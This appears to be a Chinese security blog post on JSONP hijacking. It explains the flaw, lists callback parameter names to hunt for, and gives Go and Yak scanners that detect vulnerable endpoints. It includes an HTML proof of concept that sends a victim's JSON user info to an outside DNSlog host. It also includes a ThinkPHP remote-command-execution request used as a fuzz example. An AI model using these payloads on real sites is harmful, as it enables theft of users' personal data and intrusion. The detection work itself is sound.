Time: 20220208:other: 首发于微信公众号「Yakit」,关于一个简单漏洞的发现到自动脚本化...:JSONP漏洞发现到漏洞挖掘
--------

# 什么是JSONP劫持漏洞

**同源策略**(同协议、同域名、同端口)导致的不同域名的网站无法传输数据，但是在某些时刻我们有需要进行跨域传输数据。
这时候**jsonp**身为跨域的方法中的一个就孕育而生了，由于html标签中的`<script>` 、`<img>`、`<iframe>` 这三个标签是允许进行资源的跨域获取的，jsonp就是利用了这三个标签中的其中一个 `<script>` 利用js代码动态生成script标签然后利用标签中的src属性来进行资源的跨域调用。
在数据传输未设置有效的校验的情况下，就有可能导致**JSONP劫持漏洞**，造成信息泄漏。

![](/static/img/WechatIMG2648.png)

在配置存在问题的情况下，**jsonp**使用**回调函数**来在第三方网站调出我们的敏感信息，从而达到获取敏感信息的目的，常见的利用场景如下：

* 获取个人信息，蓝队反制，蜜罐溯源等等
* 用于跨域传输数据，通过jsonp发起请求，得到泄露的**csrf_token**然后，利用这个token 实现**CSRF** 攻击
 

# JSONP 漏洞挖掘原理

* 使用火狐/谷歌浏览器打开开发者模式，选择`Network`，勾选`Preserve log`选项，防止干扰；在左下搜栏目寻找或者在可能存在`jsonp`的地方添加检索相应的`关键字`，访问目标相关网站即可：

```
jsonp
jsoncb
jsonpcb
cb
json
jsonpcall
jsoncall
jQuery
callback
back
```
在JSONP挖掘中，并不是只有callback才会出现JSONP漏洞，我们可一自己构造调用，毕竟`<script>`标签不支持同源策略，只有没有referer等限制，就有可能存在漏洞，其中POC如下：这里使用DNSlog来获取回调的信息：

```html
<script type="text/javascript">function jsonp_1610359498402_9620(json){
alert(JSON.stringify(json))
new Image().src="http://xxxx6.ceye.io/" + JSON.stringify(json)
}</script>
<script src="https://pcw-api.xxxxx.com/passport/user/userinfodetail?area=tw&callback=jsonp_1610359498402_9620"></script>
```


# 自动化漏洞扫描JSONP漏洞


* 被动扫描，类似X-ray
* 主动扫描，爬虫爬取链接识别
* 可以在疑似存在jsonp的地方加上`callback` 看看是否存在回调

**思路**

* 利用 https://github.com/JonCooperWorks/judas 这种网络钓鱼的插件的方式来进行筛选
* xray使用的是 google martian 这个库，去康康
* 搜索 golang proxy http 进行学习 
* 被动扫描案例 https://github.com/Buzz2d0/taser
* 但是最好可以结合BP来搞，就像是xray代理那样


**主动扫描**

使用[RAD](https://github.com/chaitin/rad)爬虫手机网址，使用[check_jsonp_based_on_ast](https://github.com/jweny/check_jsonp_based_on_ast)进行漏洞检测，这里使用携程的的一个jsonp进行验证

```
https://accounts.ctrip.com/ssoproxy/ssoGetUserInfo?jsonp=jQuery2398423949823
```
脚本已经上传GitHub： https://github.com/shangzeng/GolangTools

![](/static/img/WechatIMG2649.png)

**被动扫描**

简而言之，还是需要先了解`代理`相关的的资料，再根据代理相关的数据进行修改。流量转发到我们设定的端口，然后在端口进行循环监听，筛选数据，在匹配到合适的数据就进行输出：

```golang
package main

import (
	"fmt"
	"bufio"
	"log"
	"net"
	"net/http"
	"io/ioutil"
)
var client = http.Client{}
func main() {
	listener, err := net.Listen("tcp", "127.0.0.1:7777") // 监听端口
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		go handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	req, err := http.ReadRequest(bufio.NewReader(conn)) // 读取代理中的请求
	if err != nil {
		log.Println(err)
		return
	}
	req.RequestURI = ""
	resp, err := client.Do(req) // 发送请求获取响应
	if err != nil {
		log.Println(err)
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(body)) // 输出测试
	_ = resp.Write(conn)     // 将响应返还给客户端
	_ = conn.Close()
}
```

下面是http版本的被动扫描,https 的不会证书相关


```goalng

package main

import (
	"fmt"
	"bufio"
	"log"
	"net"
	"net/http"
	_"io/ioutil"
	"github.com/robertkrimen/otto/ast"
	"github.com/robertkrimen/otto/parser"
	_"encoding/json"
	"io/ioutil"
	"net/url"
	"regexp"
	_"os"
)
var client = http.Client{}
func main() {
	listener, err := net.Listen("tcp", "127.0.0.1:7777") // 监听端口
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		go handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	// 读取代理中的请求
	req, err := http.ReadRequest(bufio.NewReader(conn))
	if err != nil {
		log.Println(err)
		return
	}
	req.RequestURI = ""
	// 发送请求获取响应
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}
	// 输出测试
	//body, _ := ioutil.ReadAll(resp.Body)
	//fmt.Println(req.URL.String())
	// 检测
	result, _ := CheckSenseJsonp(req.URL.String())
	if result {
		fmt.Println("存在jsonp",req.URL.String())
	}
	_ = resp.Write(conn)     // 将响应返还给客户端
	_ = conn.Close()
}
//基于AST的JSONP劫持漏洞检测
//1.解析js路径，检查query所有key是否满足正则 (?m)(?i)(callback)|(jsonp)|(^cb$)|(function)
//2.referer配置为同域，请求js获取响应
//3.js响应生成AST，如果满足
//		a) Callee.Name == callback函数名
//		b) 递归遍历AST 获取所有的字段和对应的value
//		c) 字段为敏感字段（满足正则(?m)(?i)(uid)|(userid)|(user_id)|(nin)|(name)|(username)|(nick)），且value不为空
//4.替换Referer后再请求一次，重新验证步骤3
//
//调用方式
//入参：js路径
//返回：是否存在漏洞，err
//result, err := CheckSenseJsonp("http://127.0.0.1/jsonp_env/getUser.php?id=1&jsoncallback=callbackFunction")
func CheckSenseJsonp(jsUrl string)(bool, error){
	// 准备referer
	queryMap, domainString, err := UrlParser(jsUrl)
	if err != nil{
		return false, err
	}
	// 检查jsonp关键字
	isCallback, callbackFuncName, err := CheckJSIsCallback(queryMap)
	if isCallback{
		//	referer： host 请求
		normalRespContent, err := GetJsResponse(jsUrl, domainString)
		if err != nil{
			return false, err
		}
		//  检查JS语句
		isJsonpNormal , err := CheckJsRespAst(normalRespContent, callbackFuncName)
		if err != nil{
			return false, err
		}
		// 如果包含敏感字段 将 referer 置空 再请求一次
		if isJsonpNormal{
			noRefererContent, err := GetJsResponse(jsUrl, "")
			if err != nil{
				return false, err
			}
			isJsonp , err := CheckJsRespAst(noRefererContent, callbackFuncName)
			if err != nil{
				return false, err
			}
			return isJsonp, nil
		}
	}
	return false, nil
}
func UrlParser(jsUrl string)(url.Values, string, error){
	urlParser, err := url.Parse(jsUrl)
	if err != nil{
		return nil, "", err
	}
	// 拼接原始referer
	domainString := urlParser.Scheme + "://" + urlParser.Host
	return urlParser.Query(), domainString, nil
}
func CheckJSIsCallback(queryMap url.Values) (bool,string, error){
	var re = regexp.MustCompile(`(?m)(?i)(callback)|(jsonp)|(^cb$)|(function)`)
	for k, v :=range queryMap {
		regResult := re.FindAllString(k, -1)
		if len(regResult) > 0 && len(v)>0 {
			return true, v[0], nil
		}
	}
	return false, "",nil
}
func CheckIsSensitiveKey(key string) (bool,error) {
	var re = regexp.MustCompile(`(?m)(?i)(uid)|(userid)|(user_id)|(nin)|(name)|(username)|(nick)`)
	regResult := re.FindAllString(key, -1)
	if len(regResult) > 0 {
		return true, nil
	}
	return false, nil
}
func GetJsResponse(jsUrl string, referer string) (string, error) {
	req, err := http.NewRequest("GET", jsUrl, nil)
	if err != nil {
		return "", nil
	}
	req.Header.Set("Referer", referer)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode == 200 {
		return string(body), nil
	}
	return "", nil
}
func CheckJsRespAst(content string, funcName string) (bool,error){
	// 解析js语句，生成 *ast.Program 或 ErrorList
	program, err := parser.ParseFile(nil, "", content, 0)
	if err != nil{
		return false, err
	}
	if len(program.Body) > 0 {
		statement := program.Body[0]
		expression := statement.(*ast.ExpressionStatement).Expression
		expName := expression.(*ast.CallExpression).Callee.(*ast.Identifier).Name
		// 表达式中函数名与query函数名不一致 直接返回false
		if funcName != expName{
			return false, err
		}
		argList := expression.(*ast.CallExpression).ArgumentList
		for _, arg := range argList{
			result := DealAstExpression(arg)
			if result != true{
				continue
			}
			return result, nil
		}
	}
	//ast树为空 直接返回
	return false, nil
}
func DealAstExpression(expression ast.Expression)bool{
	objectLiteral, isObjectLiteral := expression.(*ast.ObjectLiteral)
	if isObjectLiteral{
		values := objectLiteral.Value
		for _, value := range values{
			result := DealAstProperty(value)
			if result != true{
				continue
			}
			return result
		}
	}
	return false
}
func DealAstProperty(value ast.Property)bool{
	secondLevelValue := value.Value
	// 表达式中是数组/对象的 递归
	objectLiteral, isObjectLiteral := secondLevelValue.(*ast.ObjectLiteral)
	arrayLiteral, isArrayLiteral := secondLevelValue.(*ast.ArrayLiteral)
	stringLiteral, isStringLiteral := secondLevelValue.(*ast.StringLiteral)
	numberLiteral, isNumberLiteral := secondLevelValue.(*ast.NumberLiteral)
	if isObjectLiteral {
		thirdLevelValue := objectLiteral.Value
		for _, v := range thirdLevelValue {
			DealAstProperty(v)
		}
	} else if isArrayLiteral {
		thirdLevelValue := arrayLiteral.Value
		for _, v := range thirdLevelValue {
			DealAstExpression(v)
		}
	} else if isStringLiteral{
	// 表达式中value为字符串/数字的 才会检测key value
		thirdLevelValue := stringLiteral.Value
		isSensitiveKey, _ := CheckIsSensitiveKey(value.Key)
		if isSensitiveKey && thirdLevelValue != ""{
			return true
		}
	} else if isNumberLiteral {
		thirdLevelValue := numberLiteral.Value
		isSensitiveKey, _ := CheckIsSensitiveKey(value.Key)
		if isSensitiveKey && thirdLevelValue != 0{
			return true
		}
	}
	return false
}
```

# 使用Yak被动扫描jsonp漏洞

通过上面我们可以知道，jsonp的搜索与发现是个比较容易流程化的操作，而且相对于主动扫描，被动发现也更加适合，因此我们这里可以写一个被动扫描插件，来代替手工操作,而且解决了HTTPS的问题

其中Yak的开发文档如下：

```html
https://www.yaklang.io/docs
```
打开Yakit,选择【插件仓库】，选择【+新插件】，这里的插件有三种模式：

* 以 Webhook 为通信媒介的原生 Yak 模块，通过核心引擎启动新的 yak 执行进程来控制执行过程；
* 以 MITM 劫持过程为基础 Hook 点的 Yak 模块，
* 以 Yaml 为媒介封装 Nuclei PoC 的模块，本质上也是执行一段 Yak 代码，原理与（1）相同

我们使用**MITM**模块，这里我们需要了解的几个函数已经存在注释了，讲的很清楚。 **jsonp** 主要出现在请求参数里面，因此使用`mirrorNewWebsitePathParams` 模块，其他的不用注释掉就好

```
# mitm plugin template
yakit_output(MITM_PARAMS)
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "https://example.com")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorNewWebsitePathParams(results...)
}
# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
}
```

在被动接收流量后，我们首先应当删选出包含**jsonp**的请求，这里使用关键字匹配的方式进行搜索：

```go
# 请求存在关键词检测为jsonp数据
availableJSONPParamNames = [
    "jsonp","jsoncb","jsonpcb","cb","json","jsonpcall","jsoncall","jQuery","callback","back",
]
```

在字符串的比对中，时使用 **[str](https://www.yaklang.io/docs/buildinlibs/lib_str)** 工具库进行，这里注意大小写问题


```go
str.StringSliceContains(availableJSONPParamNames, str.ToLower(paramName))
```

在**Yak**中，提供了 **[fuzz](https://www.yaklang.io/docs/buildinlibs/lib_fuzz)** 工具库来进行请求的发送与接收,例如官方提供的POC如下:

```golang
# fuzz.HTTPRequest 可以直接 接收 req 数据 进行发送，并允许一定的错误
fReq, err := fuzz.HTTPRequest(`
POST /index.php?s=captcha HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
`)
# Yak 的报错处理类似于golang 
if err != nil {
    die(err)
}
# 发送请求，接收返回数据
reqs, err := fReq.Exec()
if err != nil {
    die(err)
}

for rsp = range reqs {
    if rsp.Error != nil {
        log.error(rsp.Error)
        continue
    }
    if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rsp.ResponseRaw) {
        println("found thinkphp vuls...")
        break
    }
}
```

在获取jsonp的URL后，我们还要判断返回的数据中是否存在敏感信息，这里使用正则表达式**[re](https://www.yaklang.io/docs/buildinlibs/lib_re)**进行匹配

```go
re.Match(`(nick)|(pass)|(name)|(data)`,rsp.ResponseRaw)
```

最后的逻辑思维如下：
1. 首先从流量中筛选出可能存在jsonp的流量
2. 发送请求包，看返回值是否存在敏感信息
3. 去掉referer,cookie等信息，看是否还会返回敏感信息【还没写完】


不得不说**Yak**的插件做到了简单快速，在不到半天的情况下，就从 **0基础** 到可以的写出一个脚本来，最后效果如下：

![](/static/img/WechatIMG2650.png)

